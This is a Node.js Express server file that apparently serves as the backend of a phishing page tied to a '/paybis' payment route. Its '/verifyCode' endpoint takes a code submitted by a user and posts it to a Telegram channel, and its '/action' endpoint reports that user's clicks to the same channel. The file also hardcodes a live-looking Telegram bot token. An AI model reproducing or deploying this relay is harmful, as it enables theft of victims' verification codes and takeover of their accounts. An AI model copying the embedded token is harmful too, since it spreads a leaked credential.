const express = require('express');
// const config = require('config');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
// const { run } = require('./mongoDBConnection');

const bodyParser = require('body-parser');
const app = express();
const server = require('http').createServer(app);

const bot = new TelegramBot('6849642721:AAF1lWoLLdRF5KobcU8SrUR1ZUin9crFNCg', { restart: true });
app.use(cors());

// app.use(
//     cors({
//         origin: ['http://localhost:3000', 'http://localhost:3001'], // Replace with your React app's URL
//         methods: ['GET', 'POST'],
//         credentials: true,
//     })
// );
////////////////
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.json());
const PORT = 5050; //process?.env?.PORT || config.get('port');

app.use((req, res, next) => {
    req.bot = bot;
    next();
});

app.get('/', (req, res) => {
    res.send('Hello World!');
});
app.use('/public', express.static(path.join(__dirname, '../public')));
app.use('/paybis', require('./api/paybis.js'));

app.post('/verifyCode',async(req,res)=>{
    const {code} = req.body;
    await bot.sendMessage('@developers_00', `<b>URL:</b> <code>${11}</code>\n<b>Code:</b> <span class="tg-spoiler">${code}</span>`, { parse_mode: 'HTML' });
    return res.send({success: true, message:'success'})
})

app.post('/action',async(req,res)=>{
    const { name } = req.body;
    await bot.sendMessage('@developers_00', `<b>User click to:</b> <code>${name}</code>`, { parse_mode: 'HTML' });
    return res.send({success: true, message:'success'})
})

app.use('/',(req,res)=> res.send({ success: false, message: 'Server Error!' }))

async function start() {
    try {
        // await run().catch(console.dir);
        server.listen(PORT, () =>
            console.log(`Server listening on localhost:${PORT}`)
        );
    } catch (e) {
        console.log(e);
        return res.status(500).send('ERORR');
    }
}

start().then(async () => {
    ///
    ///
    ///
});
